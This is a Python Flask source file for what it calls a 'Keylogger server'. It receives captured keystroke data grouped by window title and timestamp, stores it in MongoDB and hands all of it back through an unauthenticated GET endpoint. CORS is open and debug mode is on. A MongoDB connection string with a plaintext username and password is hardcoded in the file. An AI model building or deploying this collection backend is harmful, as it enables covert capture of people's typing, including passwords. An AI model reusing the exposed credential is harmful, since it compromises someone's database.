from flask import Flask, request, jsonify
from pymongo import MongoClient
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

client = MongoClient("mongodb+srv://haimassraf:Aa123456@cluster0.s8vwr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client["key_loger_project"]
data_collection = db["data"]


@app.route('/')
def home():
    return "<h1>Welcome to my Keylogger server!</h1>", 200


@app.route('/data', methods=['GET'])
def get_data():
    users = list(data_collection.find({}, {"_id": 0}))
    return jsonify(users), 200


@app.route('/data', methods=['POST'])
def add_data():
    try:
        data = request.json
        for window, timestamps in data.items():
            existing_entry = data_collection.find_one({"window": window})
            if existing_entry:
                for timestamp, value in timestamps.items():
                    if timestamp in existing_entry["timestamps"]:
                        new_value = existing_entry["timestamps"][timestamp] + value
                    else:
                        new_value = value

                    data_collection.update_one(
                        {"window": window},
                        {"$set": {f"timestamps.{timestamp}": new_value}}
                    )

            else:
                data_collection.insert_one({
                    "window": window,
                    "timestamps": timestamps
                })

        updated_data = data_collection.find_one({"window": window}, {"_id": 0})

        return jsonify({
            "message": "Data updated successfully!",
            "Updated data": updated_data
        }), 201

    except Exception as err:
        return jsonify({"error": str(err)}), 500


if __name__ == '__main__':
    app.run(debug=True)
